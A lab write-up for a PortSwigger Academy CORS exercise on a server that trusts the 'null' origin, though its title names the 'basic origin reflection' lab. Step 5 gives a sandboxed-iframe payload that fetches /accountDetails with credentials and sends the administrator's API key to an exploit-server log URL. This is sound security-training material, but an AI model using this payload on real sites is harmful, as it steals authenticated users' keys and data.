# CORS - vulnerability with basic origin reflection 

## 📌 Lab Details
- **Title**: CORS vulnerability with basic origin reflection
- **Difficulty**: Apprentice
- **Category**: Cross-Origin Resource Sharing
- **Lab URL**: https://portswigger.net/academy/labs/launch/9d294029d336d1a8cefb9d84577fc92304467e91f4f9918e74b50be2c561db79?referrer=%2fweb-security%2fcors%2flab-null-origin-whitelisted-attack

## 🔍 Summary
This lab exploited **insecure CORS trusting the** `"null"` **origin**, allowing you to use a **sandboxed iframe** to send a credentialed `XMLHttpRequest` cross-origin and steal the **administrator’s API key**.

## 🛠 Steps to Solve
1. Use the browser to log in and access your account page.
2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
3. Send the request to **Burp Repeater** and resubmit it with the added header: `Origin:null`.
4. Observe that the `null` origin is reflected in the `Access-Control-Allow-Origin` header.
5. Inject the payload on the **Exploit** server:
   ```sh
   <iframe sandbox="allow-scripts" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+this.responseText;
    };
    </script>"></iframe>
   ```
6. Deliver the exploit to the victim and access the log to find the `API` key.

## 📖 Key Takeaways
- CORS misconfiguration trusting `"null"` enables attacks from sandboxed iframes.
- A **sandboxed iframe** (`sandbox="allow-scripts"`) produces a "null" origin.
- `withCredentials: true` leaks authenticated data cross-origin if `"null"` is allowed.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d17855c7-cbc6-4268-b41b-59bbbe4296c2" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/80b0b679-4a93-40e2-8daf-d987428ed83c" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2f48639b-5ee6-4bc6-a65b-2ad2496d7dae" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3150e08c-e37e-4588-a1e4-680dfdf1f549" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/d1388595-d7e5-4b82-9f92-c429c2e9d7a8" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/b96e9780-0933-44c7-b0e1-ec6647c711a4" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/9fb3a8c5-3253-4e13-88f8-6dbd27276efd" />
